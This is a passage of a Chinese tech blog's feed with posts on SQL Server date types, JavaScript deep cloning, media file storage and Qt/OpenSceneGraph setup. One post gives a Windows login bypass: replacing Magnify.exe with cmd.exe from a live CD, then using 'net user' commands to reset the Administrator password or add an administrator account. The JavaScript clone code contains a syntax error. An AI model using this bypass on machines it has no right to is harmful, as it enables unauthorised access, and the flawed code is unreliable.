    <link href="https://huangwang.github.io/2019/10/13/SQLServer2008%E4%B8%AD%E6%97%A5%E6%9C%9F%E7%B1%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E7%9A%84%E5%AD%98%E5%82%A8/"/>
    <id>https://huangwang.github.io/2019/10/13/SQLServer2008中日期类型数据的存储/</id>
    <published>2019-10-13T10:15:02.000Z</published>
    <updated>2019-10-13T10:37:47.066Z</updated>
    
    <content type="html"><![CDATA[<p>SQL Server 2008中有datetime、datetime2、datetimeoffset三种数据类型用于存储时间类型数据。它们之间的差别主要有：</p><ul><li>datetime、datetime2不存储时区信息，datetimeoffset存储时区信息。</li><li>datetime与datetime2区别是两者存储字节大小和精度不同，后者优于前者。</li></ul><p>因此，在存储时间信息时，优先使用datetimeoffset数据类型。当使用datetime和datetime2数据类型时，因没有时区信息，很多客户端链接库会将存储的时间默认为UTC时间。例如：</p><p>SQL Server2008中存储某人的出生日期为“1970-01-01 00:00:00”，通过sequelizejs框架读取得到出生日期将是“1970-01-01T00:00:00Z”，<strong>这里 T 仅仅是分隔日期和时间的符号，没有其他含义，而 Z 表示 UTC 时间。</strong></p><p>这时需要根据自己所在时区对时间进行修正。最简单的方法是在SQL语句中进行修正，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select birthday1, dateadd(hour,-8,birthday) from students</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://stackoverflow.com/questions/18518290/how-to-add-hours-to-current-date-in-sql-server/18518412" target="_blank" rel="noopener">How to add hours to current date in SQL Server?</a>,by stackoverflow.</li><li><a href="https://docs.microsoft.com/en-us/dotnet/standard/datetime/choosing-between-datetime" target="_blank" rel="noopener">Choosing between DateTime, DateTimeOffset, TimeSpan, and TimeZoneInfo</a>,by microsoft.</li><li><a href="https://blog.csdn.net/happymagic/article/details/45065321" target="_blank" rel="noopener">datetime、datetime2的区别</a>,by happymagic.</li><li><a href="https://www.cnblogs.com/Gin-23333/p/5066823.html" target="_blank" rel="noopener">DateTime , DateTime2 ,DateTimeOffset 之间的小区别</a>,by 神崎橙.</li><li><a href="https://segmentfault.com/a/1190000004292140" target="_blank" rel="noopener">关于“时间”的一次探索</a>,by KohPoll.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;SQL Server 2008中有datetime、datetime2、datetimeoffset三种数据类型用于存储时间类型数据。它们之间的差别主要有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;datetime、datetime2不存储时区信息，datetimeoffset存储时区信
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="数据库" scheme="https://huangwang.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript对象深度克隆</title>
    <link href="https://huangwang.github.io/2019/10/10/JavaScript%E5%AF%B9%E8%B1%A1%E6%B7%B1%E5%BA%A6%E5%85%8B%E9%9A%86/"/>
    <id>https://huangwang.github.io/2019/10/10/JavaScript对象深度克隆/</id>
    <published>2019-10-10T13:10:21.000Z</published>
    <updated>2019-10-10T13:37:32.701Z</updated>
    
    <content type="html"><![CDATA[<p>JavaScript并没有提供对象的复制方法，只能借助第三方库或自己实现对象的深度克隆。具体方法如下：</p><h1 id="第三方库实现"><a href="#第三方库实现" class="headerlink" title="第三方库实现"></a>第三方库实现</h1><p>实现JavaScript库的深度克隆的第三方库主要有：</p><ul><li>Underscore —— _.clone()</li><li>jQuery —— $.clone() / $.extend()</li><li>lodash —— <em>.clone() / </em>.cloneDeep()</li><li>借助 JSON 全局对象</li></ul><h2 id="Underscore-——-clone"><a href="#Underscore-——-clone" class="headerlink" title="Underscore —— _.clone()"></a>Underscore —— _.clone()</h2><p>在 Underscore 中有这样一个方法：_.clone()，这个方法实际上是一种浅复制 (shallow-copy)，所有嵌套的对象和数组都是直接复制引用而并没有进行深复制。其代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// Create a (shallow-cloned) duplicate of an object.</span><br><span class="line">_.clone = function(obj) &#123;</span><br><span class="line">  if (!_.isObject(obj)) return obj;</span><br><span class="line">  return _.isArray(obj) ? obj.slice() : _.extend(&#123;&#125;, obj);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="jQuery-——-clone-extend"><a href="#jQuery-——-clone-extend" class="headerlink" title="jQuery —— $.clone() / $.extend()"></a>jQuery —— $.clone() / $.extend()</h2><p>在 jQuery 中也有这么一个叫 $.clone() 的方法，可是它并不是用于一般的 JS 对象的深复制，而是用于 DOM 对象。与 Underscore 类似，可以通过 $.extend() 方法来完成深复制。值得庆幸的是，在 jQuery 中可以通过添加一个参数来实现递归extend。调用$.extend(true, {}, …)就可以实现深复制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var x = &#123;</span><br><span class="line">    a: 1,</span><br><span class="line">    b: &#123; f: &#123; g: 1 &#125; &#125;,</span><br><span class="line">    c: [ 1, 2, 3 ]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var y = $.extend(&#123;&#125;, x),          //shallow copy</span><br><span class="line">    z = $.extend(true, &#123;&#125;, x);    //deep copy</span><br><span class="line"></span><br><span class="line">y.b.f === x.b.f       // true</span><br><span class="line">z.b.f === x.b.f       // false</span><br></pre></td></tr></table></figure><h2 id="lodash-——-clone-cloneDeep"><a href="#lodash-——-clone-cloneDeep" class="headerlink" title="lodash —— .clone() / .cloneDeep()"></a>lodash —— <em>.clone() / </em>.cloneDeep()</h2><p>在lodash中关于复制的方法有两个，分别是<em>.clone()和</em>.cloneDeep()。其中<em>.clone(obj, true)等价于</em>.cloneDeep(obj)。</p><h2 id="借助-JSON-全局对象"><a href="#借助-JSON-全局对象" class="headerlink" title="借助 JSON 全局对象"></a>借助 JSON 全局对象</h2><p>针对纯 JSON 数据对象的深复制，使用 JSON 全局对象的 parse 和 stringify 方法来实现深复制也算是一个简单讨巧的方法，但它能正确处理的对象只有 Number, String, Boolean, Array, 扁平对象，即那些能够被 json 直接表示的数据结构。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function jsonClone(obj) &#123;</span><br><span class="line">    return JSON.parse(JSON.stringify(obj));</span><br><span class="line">&#125;</span><br><span class="line">var clone = jsonClone(&#123; a:1 &#125;);</span><br></pre></td></tr></table></figure><h1 id="递归实现"><a href="#递归实现" class="headerlink" title="递归实现"></a>递归实现</h1><p>下面是递归实现对象深度克隆的可用方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">function clone(obj) &#123;</span><br><span class="line">  // Handle the 3 simple types, and null or undefined</span><br><span class="line">  if (null == obj || &quot;object&quot; != typeof obj) return obj;</span><br><span class="line"> </span><br><span class="line">  // Handle Date</span><br><span class="line">  if (obj instanceof Date) &#123;</span><br><span class="line">    var copy = new Date();</span><br><span class="line">    copy.setTime(obj.getTime());</span><br><span class="line">    return copy;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  // Handle Array</span><br><span class="line">  if (obj instanceof Array) &#123;</span><br><span class="line">    var copy = [];</span><br><span class="line">    for (var i = 0, var len = obj.length; i &lt; len; ++i) &#123;</span><br><span class="line">      copy[i] = clone(obj[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return copy;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  // Handle Object</span><br><span class="line">  if (obj instanceof Object) &#123;</span><br><span class="line">    var copy = &#123;&#125;;</span><br><span class="line">    for (var attr in obj) &#123;</span><br><span class="line">      if (obj.hasOwnProperty(attr)) copy[attr] = clone(obj[attr]);</span><br><span class="line">    &#125;</span><br><span class="line">    return copy;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  throw new Error(&quot;Unable to copy obj! Its type isn&apos;t supported.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://jerryzou.com/posts/dive-into-deep-clone-in-javascript/" target="_blank" rel="noopener">深入剖析 JavaScript 的深复制</a>,by 咀嚼之味.</li><li><a href="https://www.jb51.net/article/84541.htm" target="_blank" rel="noopener">深入理解JavaScript中的对象复制(Object Clone)</a>,by jingxian.</li><li><a href="https://book.douban.com/subject/11874748/" target="_blank" rel="noopener">JavaScript语言精粹（修订版）</a>,by Douglas Crockford著.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;JavaScript并没有提供对象的复制方法，只能借助第三方库或自己实现对象的深度克隆。具体方法如下：&lt;/p&gt;
&lt;h1 id=&quot;第三方库实现&quot;&gt;&lt;a href=&quot;#第三方库实现&quot; class=&quot;headerlink&quot; title=&quot;第三方库实现&quot;&gt;&lt;/a&gt;第三方库实现&lt;/h
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="前端" scheme="https://huangwang.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="JavaScript" scheme="https://huangwang.github.io/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>图片或多媒体大文件的存储与管理</title>
    <link href="https://huangwang.github.io/2019/10/10/%E5%9B%BE%E7%89%87%E6%88%96%E5%A4%9A%E5%AA%92%E4%BD%93%E5%A4%A7%E6%96%87%E4%BB%B6%E7%9A%84%E5%AD%98%E5%82%A8%E4%B8%8E%E7%AE%A1%E7%90%86/"/>
    <id>https://huangwang.github.io/2019/10/10/图片或多媒体大文件的存储与管理/</id>
    <published>2019-10-10T00:45:27.000Z</published>
    <updated>2019-10-11T14:07:39.267Z</updated>
    
    <content type="html"><![CDATA[<p>图片、声音、视频等大文件在后台数据库中的存储管理方式通常有两种:</p><ul><li>文件存储到数据库中</li><li>文件存储到文件系统中,数据库中保存文件路径</li></ul><p>这两种文件存储管理方式有各自优缺点, 选择哪种方法存储大文件应根据具体情况而定。</p><h1 id="文件系统存储管理方式"><a href="#文件系统存储管理方式" class="headerlink" title="文件系统存储管理方式"></a>文件系统存储管理方式</h1><p>文件系统存储管理方式将文件存储到磁盘中，在数据库中使用varchar类型记录文件路径。该方法的缺点主要有：</p><ul><li>文件不支持DELETE</li></ul><p>当删除文件路径时，不支持自动删除对应文件。</p><ul><li>文件不支持事务隔离</li></ul><p>如果改变文件内容或删除文件，这些操作将立刻被其他客户端看到。</p><ul><li>文件不支持回滚</li></ul><p>数据库记录能够恢复，但文件删除不能。</p><ul><li><p>文件不支持数据库的备份工具</p></li><li><p>文件不支持SQL的访问权限设置</p></li><li><p>文件不是SQL数据类型</p></li></ul><p>数据库不会验证文件路径是否有效。当文件移动、重命名、删除时，数据不会自动更新路径。</p><h1 id="数据库中存储文件"><a href="#数据库中存储文件" class="headerlink" title="数据库中存储文件"></a>数据库中存储文件</h1><p>数据库通常支持BLOB类型，可用于存储任何二进制数据。数据库中存储文件，其优点对应文件系统管理存储方式的缺点。同样，数据库中存储文件也存在一些缺点：</p><ul><li>对数据库的读/写的速度永远都赶不上文件系统处理的速度</li><li>数据库备份变的巨大，越来越耗时间</li><li>对文件的访问需要穿越你的应用层和数据库层</li></ul><h1 id="多媒体大文件存储建议"><a href="#多媒体大文件存储建议" class="headerlink" title="多媒体大文件存储建议"></a>多媒体大文件存储建议</h1><p>当只涉及较小规模图片、音频的存储时，建议直接存放到数据库中。当涉及视频大文件存储时，建议还是用文件系统存储。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://gitee.com/jkxqj/java_wiki/blob/master/SQL%E5%8F%8D%E6%A8%A1%E5%BC%8F.pdf" target="_blank" rel="noopener">SQL反模式</a>,by Bill karwin著, 谭振林, Push Chen译.</li><li><a href="https://www.cnblogs.com/hellojesson/p/6295797.html" target="_blank" rel="noopener">特殊格式文件(视频、声音等) 在数据库中的存储方式</a>,by Jesson.</li><li><a href="https://www.cnblogs.com/wangtao_20/p/3440570.html" target="_blank" rel="noopener">关于图片或者文件在数据库的存储方式归纳</a>,by 王滔.</li><li><a href="https://www.cnblogs.com/studyzy/archive/2009/02/23/1396712.html" target="_blank" rel="noopener">SQL Server 2008新特性——FILESTREAM</a>,by 曾毅.</li><li><a href="https://www.iteye.com/blog/lxy2330-961266" target="_blank" rel="noopener">oracle对大对象类型操作：blob，clob，nclob，bfile</a>,by lxy2330.</li><li><a href="https://www.zhihu.com/question/22128674" target="_blank" rel="noopener">类似优酷土豆视频网站的视频源文件一般是存储在什么样系统上？</a>,by zhihu.</li><li><a href="https://stackoverflow.com/questions/18518290/how-to-add-hours-to-current-date-in-sql-server/18518412" target="_blank" rel="noopener">How to add hours to current date in SQL Server?</a>,by stackoverflow.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;图片、声音、视频等大文件在后台数据库中的存储管理方式通常有两种:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文件存储到数据库中&lt;/li&gt;
&lt;li&gt;文件存储到文件系统中,数据库中保存文件路径&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这两种文件存储管理方式有各自优缺点, 选择哪种方法存储大文件应根据具体情
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="数据库" scheme="https://huangwang.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
      <category term="软件工程" scheme="https://huangwang.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Windows下QT与OSG开发环境配置</title>
    <link href="https://huangwang.github.io/2019/10/10/Windows%E4%B8%8BQT%E4%B8%8EOSG%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <id>https://huangwang.github.io/2019/10/10/Windows下QT与OSG开发环境配置/</id>
    <published>2019-10-10T00:18:23.000Z</published>
    <updated>2019-10-13T10:17:54.166Z</updated>
    
    <content type="html"><![CDATA[<p>最近想尝试使用QT开发图形用户界面，OSG负责三维展示的解决方案，于是研究了一下Windows下OSG的编译安装配置，以及在QT中集成OSG的配置过程。过程记录如下：</p><h1 id="QT-OSG开发环境配置"><a href="#QT-OSG开发环境配置" class="headerlink" title="QT+OSG开发环境配置"></a>QT+OSG开发环境配置</h1><p>QT+OSG开发环境配置将使用QT Creator集成环境进行图形用户界面开发，使用Desktop Qt 5.9.8 MSVC2017 64构建套件编译链接调试C++程序。</p><h2 id="Visual-Studio-Community-2017-下载安装"><a href="#Visual-Studio-Community-2017-下载安装" class="headerlink" title="Visual Studio Community 2017 下载安装"></a>Visual Studio Community 2017 下载安装</h2><p>下载安装Visual Studio Community 2017的“使用C++的桌面开发”工作负载。这将为QT提供MSVC2017 64bit编译套件。</p><h2 id="CDB-调试器下载安装"><a href="#CDB-调试器下载安装" class="headerlink" title="CDB 调试器下载安装"></a>CDB 调试器下载安装</h2><p>没有安装CDB调试器，QT的Desktop Qt 5.9.8 MSVC2017 64构建套件前会出现感叹号，并且使用该构建套件调试时会报“Unable to create a debugging engine”错误。CDB调试器下载安装方法参考<a href="https://dlonng.com/posts/qt-osg" target="_blank" rel="noopener">QT - OSG 开发环境配置</a></p><h2 id="QT-5-9-8-下载安装"><a href="#QT-5-9-8-下载安装" class="headerlink" title="QT 5.9.8 下载安装"></a>QT 5.9.8 下载安装</h2><p>QT 5.9.8是 LTS 版本，其下载安装请参考<a href="https://huangwang.github.io/2019/10/07/Qt5%E9%85%8D%E7%BD%AE%E5%BC%80%E6%BA%90GSL%E6%95%B0%E5%AD%A6%E5%BA%93/">Qt5配置开源GSL数学库</a>。<strong>需要注意的是，QT 5.9.8安装过程，选择MSVC2017 64bit编译组件，如图1所示。</strong></p><p></p><p align="center">    <img src="images/qt_install.jpg" width="60%" alt="QT 5.9.8安装选择MSVC2017 64bit编译组件"></p><p></p><center>图1 QT 5.9.8安装选择MSVC2017 64bit编译组件</center><h2 id="cmake下载安装"><a href="#cmake下载安装" class="headerlink" title="cmake下载安装"></a>cmake下载安装</h2><p>到 cmake 官网下载安装 cmake，用于osg的编译安装。</p><h1 id="下载编译安装OSG"><a href="#下载编译安装OSG" class="headerlink" title="下载编译安装OSG"></a>下载编译安装OSG</h1><h2 id="下载OSG及相关软件"><a href="#下载OSG及相关软件" class="headerlink" title="下载OSG及相关软件"></a>下载OSG及相关软件</h2><p>Windows平台编译安装OSG需下载从OSG官网以下资料：</p><ul><li>OpenSceneGraph 3.6.4源代码</li><li>OpenSceneGraph-Data-3.4.0，因为找不到3.6.4版本的数据</li><li>3rdParty_VS2017_v141_x64_V11_full</li></ul><h2 id="配置OSG"><a href="#配置OSG" class="headerlink" title="配置OSG"></a>配置OSG</h2><p>打开cmake，选择osg源代码路径和osg源代码构建的路径，再点击“configure”按钮，选择Visual Studio 15 2017 Win64编译套件，配置osg如图2所示。</p><p></p><p align="center">    <img src="images/cmake_config.jpg" width="100%" alt="cmake编译osg配置"></p><p></p><center>图2 cmake编译osg配置</center><p>需要配置的地方主要有：</p><ul><li>ACTUAL_3rdparty_DIR：配置第三方库的目录</li><li>Build_OSG_EXAMPLES：选中即编译安装OSG的示例。</li><li>CMAKE_INSTALL_PREFIX：设置OSG的安装目录，通常放到C盘以外的地方，防止因权限问题安装失败。</li></ul><p>配置完成后，再持续点击“configure”按钮，知道红色警告消失。然后点击“Generate”按钮生成vs2017工程。</p><h2 id="编译OSG"><a href="#编译OSG" class="headerlink" title="编译OSG"></a>编译OSG</h2><p>在cmake中点击“Open Project”按钮，即使用 VS2017 打开 build 文件夹下的工程，点击：生成 -&gt; 批生成 -&gt; 生成 Debug 和 Release 版本的 All_BUILD 即可。</p><h2 id="安装OSG"><a href="#安装OSG" class="headerlink" title="安装OSG"></a>安装OSG</h2><p>右击解决方案的 Install 项目，点击生成，然后 Debug 平台的库文件就开始安装了，同理选择 Release 平台再重复安装。之后就可以在安装路径中看到编译的库文件了，安装路径由变量CMAKE_INSTALL_PREFIX的配置决定。</p><h2 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h2><p>OSG官方文档 <a href="http://www.openscenegraph.org/index.php/documentation/platform-specifics/windows/37-visual-studio" target="_blank" rel="noopener">Windows Compiling with Visual Studio</a>指出，OSG安装完成后需要配置如下环境变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">OSG_ROOT points to the base of the OSG file structure (the directory that contains include, src etc. subdirectories)</span><br><span class="line">OSG_BIN_PATH = %OSG_ROOT%\bin</span><br><span class="line">OSG_INCLUDE_PATH = %OSG_ROOT%\include</span><br><span class="line">OSG_LIB_PATH = %OSG_ROOT%\lib</span><br><span class="line">OSG_SAMPLES_PATH = %OSG_ROOT%\share\OpenSceneGraph\bin</span><br><span class="line">OSG_FILE_PATH = ???\OpenSceneGraph-Data-X.X</span><br><span class="line">OPENSCENEGRAPH_VERSION = 3.6.4 </span><br><span class="line">PATH 添加：%OSG_ROOT%\bin;%OSG_ROOT%\bin\osgPlugins-%OPENSCENEGRAPH_VERSION%; 这两个是配置 bin 和插件的路径。</span><br></pre></td></tr></table></figure><h1 id="OSG测试"><a href="#OSG测试" class="headerlink" title="OSG测试"></a>OSG测试</h1><h2 id="命令行测试"><a href="#命令行测试" class="headerlink" title="命令行测试"></a>命令行测试</h2><p>打开 cmd 命令行，输入osgversion，输出当前 osg 版本说明环境变量配置成功了，再来看看能不能导入模型文件，接着键入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">osgviewer cow.osg</span><br></pre></td></tr></table></figure><p>这里可能会提示系统缺少 zlibd.dll，解决方法很简单：</p><ul><li>拷贝第三方库的 dll 目录下的 zlib.dll 和 zlibd.dll 到 OSG 安装目录的 bin 目录中。</li><li>拷贝第三方库的 lib 目录下的 zlib.dll 和 zlibd.dll 到 OSG 安装目录的 lib 目录中。</li></ul><p>这时重新键入上面的命令，就可以看到一头经典的 3D 牛了，说明 OSG 安装成功了。</p><h2 id="QT-配置-OSG-库路径"><a href="#QT-配置-OSG-库路径" class="headerlink" title="QT 配置 OSG 库路径"></a>QT 配置 OSG 库路径</h2><p>新建一个 QT 的控制台项目，编辑 .pro 文件，加入 OSG 库的路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">win32:CONFIG(release, debug|release): LIBS += -L$$PWD/../../../OpenSceneGraph/lib/ -lOpenThreads -losg -losgDB -losgUtil -losgGA  -losgViewer -losgText</span><br><span class="line">else:win32:CONFIG(debug, debug|release): LIBS += -L$$PWD/../../../OpenSceneGraph/lib/ -lOpenThreadsd -losgd -losgDBd -losgUtild -losgGAd -losgViewerd -losgTextd</span><br><span class="line">else:unix: LIBS += -L$$PWD/../../../OpenSceneGraph/lib/ -lOpenThreads -losg -losgDB -losgUtil -losgGA -losgViewer -losgText</span><br><span class="line"></span><br><span class="line">INCLUDEPATH += $$PWD/../../../OpenSceneGraph/include</span><br><span class="line">DEPENDPATH += $$PWD/../../../OpenSceneGraph/lib</span><br></pre></td></tr></table></figure><p>main.cpp 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;osgViewer/Viewer&gt;</span><br><span class="line">#include &lt;osgDB/ReadFile&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    osgViewer::Viewer viewer;</span><br><span class="line">    viewer.setSceneData(osgDB::readNodeFile(&quot;cow.osg&quot;));</span><br><span class="line">    return viewer.run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行，出来一头 3D 牛，即配置成功。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://dlonng.com/posts/qt-osg" target="_blank" rel="noopener">QT - OSG 开发环境配置</a>,by 程序小哥.</li><li><a href="https://huangwang.github.io/2019/10/07/Qt5%E9%85%8D%E7%BD%AE%E5%BC%80%E6%BA%90GSL%E6%95%B0%E5%AD%A6%E5%BA%93/">Qt5配置开源GSL数学库</a>,by jackhuang.</li><li><a href="https://huangwang.github.io/2019/09/14/Ubuntu16-04%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85OSG/">Ubuntu16.04编译安装OSG</a>,by jackhuang.</li><li><a href="http://www.openscenegraph.org/index.php/documentation/platform-specifics/windows/37-visual-studio" target="_blank" rel="noopener">Windows Compiling with Visual Studio</a>,by OpenSceneGraph.</li><li><a href="https://huangwang.github.io/2018/06/21/Visual-Studio-Community-2017%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85/">Visual_Studio_Community_2017离线安装</a>,by jackhuang.</li><li><a href="https://blog.csdn.net/u013745174/article/details/53691589" target="_blank" rel="noopener">Qt-Creator常见问题</a>,by XenonSec.</li><li><a href="https://stackoverflow.com/questions/31457306/visual-studio-msb3073-error-exited-with-code-1" target="_blank" rel="noopener">Visual Studio: MSB3073 error exited with code 1</a>,by stackoverflow.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近想尝试使用QT开发图形用户界面，OSG负责三维展示的解决方案，于是研究了一下Windows下OSG的编译安装配置，以及在QT中集成OSG的配置过程。过程记录如下：&lt;/p&gt;
&lt;h1 id=&quot;QT-OSG开发环境配置&quot;&gt;&lt;a href=&quot;#QT-OSG开发环境配置&quot; cla
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="3D" scheme="https://huangwang.github.io/tags/3D/"/>
    
      <category term="计算机图形学" scheme="https://huangwang.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>Windows忘记密码无法登录的解决方案</title>
    <link href="https://huangwang.github.io/2019/10/09/Windows%E5%BF%98%E8%AE%B0%E5%AF%86%E7%A0%81%E6%97%A0%E6%B3%95%E7%99%BB%E5%BD%95%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>https://huangwang.github.io/2019/10/09/Windows忘记密码无法登录的解决方案/</id>
    <published>2019-10-09T04:09:44.000Z</published>
    <updated>2019-10-10T00:25:02.437Z</updated>
    
    <content type="html"><![CDATA[<p>突然需要在一台很久不用的Win7计算机上差一点资料，可忘记了登录密码，只能重置密码。过程记录如下：</p><h1 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h1><p>借助手头的一张linux live cd，从光盘启动，进入linux系统，然后找到windows系统盘分区，在C:\Windows\System32下，将cmd.exe重命名为Magnify.exe，然后系统重启，登录Windows操作系统，在登录界面中，调用辅助工具放大镜，即打开命令提示符，输入如下命令重置Windows账户密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 查看Windows账户</span><br><span class="line">net user</span><br><span class="line">// 修改Windows账户密码</span><br><span class="line">net user Administrator 123456</span><br><span class="line">// 重启系统用Administrator账户登录</span><br><span class="line">shutdown -r -t 00</span><br></pre></td></tr></table></figure><p>或者采用如下命令新建登录账户：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 创建用户</span><br><span class="line">net user test 123456 /add</span><br><span class="line">// 用户提权，加入管理员组</span><br><span class="line">net localgroup Administrators test /add</span><br><span class="line">// 使用完删除用户</span><br><span class="line">net user test /delete</span><br></pre></td></tr></table></figure></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://blog.csdn.net/cx1990820/article/details/72628241" target="_blank" rel="noopener">关闭windows默认共享</a>,by Blue_sky90.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;突然需要在一台很久不用的Win7计算机上差一点资料，可忘记了登录密码，只能重置密码。过程记录如下：&lt;/p&gt;
&lt;h1 id=&quot;解决思路&quot;&gt;&lt;a href=&quot;#解决思路&quot; class=&quot;headerlink&quot; title=&quot;解决思路&quot;&gt;&lt;/a&gt;解决思路&lt;/h1&gt;&lt;p&gt;借助手头的
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="计算机安全" scheme="https://huangwang.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/"/>
    
      <category term="网络安全" scheme="https://huangwang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Qt5配置开源GSL数学库</title>
    <link href="https://huangwang.github.io/2019/10/07/Qt5%E9%85%8D%E7%BD%AE%E5%BC%80%E6%BA%90GSL%E6%95%B0%E5%AD%A6%E5%BA%93/"/>
    <id>https://huangwang.github.io/2019/10/07/Qt5配置开源GSL数学库/</id>
    <published>2019-10-07T01:22:55.000Z</published>
    <updated>2019-10-08T13:56:04.325Z</updated>
    
